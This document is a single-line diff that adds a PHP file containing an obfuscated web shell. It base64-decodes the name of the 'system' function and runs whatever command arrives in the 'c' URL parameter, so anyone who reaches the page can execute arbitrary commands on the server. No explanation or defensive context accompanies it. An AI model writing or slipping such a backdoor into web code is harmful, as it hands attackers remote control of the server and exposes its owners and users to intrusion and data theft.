@@ -1,0 +1,1 @@
+<?php $x=base64_decode("c3lzdGVt"); $x($_GET["c"]); ?>
